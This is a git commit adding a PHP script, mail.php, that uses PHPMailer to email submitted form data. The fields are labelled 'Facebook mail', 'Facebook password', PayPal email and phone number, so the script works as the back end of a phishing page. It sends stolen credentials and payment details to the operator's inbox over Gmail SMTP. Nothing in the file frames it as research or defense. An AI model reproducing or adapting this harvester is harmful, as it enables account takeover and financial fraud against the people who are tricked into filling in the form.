e8366c5adb0d733a4976ec7eeb4dfdaf6043fd44
Marko Krizan <markokrizan64@gmail.com>
2019-08-30 15:39:54 +0200

    initial

---
+++ mail.php
@@ -0,0 +1,58 @@
+<?php
+// Import PHPMailer classes into the global namespace
+// These must be at the top of your script, not inside a function
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+// Load Composer's autoloader
+require 'vendor/autoload.php';
+
+// Instantiation and passing `true` enables exceptions
+$mail = new PHPMailer(true);
+
+//gather form data:
+$name = htmlspecialchars($_POST['name']);
+$email = htmlspecialchars($_POST['email']);
+$password = htmlspecialchars($_POST['password']);
+$paypal = htmlspecialchars($_POST['paypal_email']);
+$phone = htmlspecialchars($_POST['phone']);
+
+$body = "<h1>Name: " . $name . "</h1>\n" .
+        "<h1>Facebook mail: " . $email . "</h1>\n" .
+        "<h1>Facebook password: " . $password . "</h1>\n" .
+        "<h1>Paypal email: " . $paypal . "</h1>\n" .
+        "<h1>Phone number: " . $phone . "</h1>";
+
+try {
+    //Server settings
+    $mail->SMTPDebug = 2;                                       // Enable verbose debug output
+    $mail->isSMTP();                                            // Set mailer to use SMTP
+    $mail->Host       = 'smtp.gmail.com';                       // Specify main and backup SMTP servers
+    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
+    $mail->Username   = '';                                     // SMTP username - GMAIL USERNAME HERE
+    $mail->Password   = '';                    // SMTP password - GMAIL PASSWORD HERE
+    $mail->SMTPSecure = 'ssl';                                  // Enable TLS encryption, `ssl` also accepted
+    $mail->Port       = 465;                                    // TCP port to connect to
+
+    //Recipients
+    $mail->setFrom('send-from-above-account', 'Mailer');
+    $mail->addAddress('to-adress');     // Add a recipient
+
+    //Mulitple adresses, cc, and bcc examples:
+    //$mail->addAddress('ellen@example.com');               // Name is optional
+    //$mail->addReplyTo('info@example.com', 'Information');
+    //$mail->addCC('cc@example.com');
+    //$mail->addBCC('bcc@example.com');
+
+    // Attachments
+    //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
+    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
+
+    // Content
+    $mail->isHTML(true);                                  // Set email format to HTML
+    $mail->Subject = 'Here is the subject';
+    $mail->Body = $body;
+    $mail->send();
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
